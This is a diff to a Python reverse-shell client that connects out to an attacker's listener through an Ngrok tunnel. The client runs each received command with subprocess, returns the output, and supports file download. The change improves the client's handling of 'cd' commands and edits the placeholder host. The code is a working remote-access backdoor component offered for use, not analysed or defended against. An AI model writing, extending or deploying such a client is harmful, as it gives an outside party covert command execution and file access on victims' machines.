@@ -20,8 +20,13 @@ def connect_to_listener(host, port):
         elif command.lower() == "download":
             client.send(command.encode())
             download_file(client)
-        elif command.lower().startswith("cd "):
-            client.send(command.encode())
+        elif command.lower().startswith("cd"):
+            location = command[3::]
+            if os.path.exists(location):
+                os.chdir(location)
+                client.send("Done ...".encode())
+            else:
+                client.send("This Location Not Found".encode())
         else:
             output = subprocess.getoutput(command)
             client.send(output.encode())
@@ -79,6 +84,6 @@ def download_file(client):
         print(f"[*] 📥 File '{file_name}' downloaded successfully")
 
 if __name__ == "__main__":
-    host = "NGROK_TUNNEL_URL"  # Replace with your Ngrok tunnel URL
+    host = "host"  # Replace with your Ngrok tunnel URL
     port = 1234  # Replace with your listener's port number
     connect_to_listener(host, port)
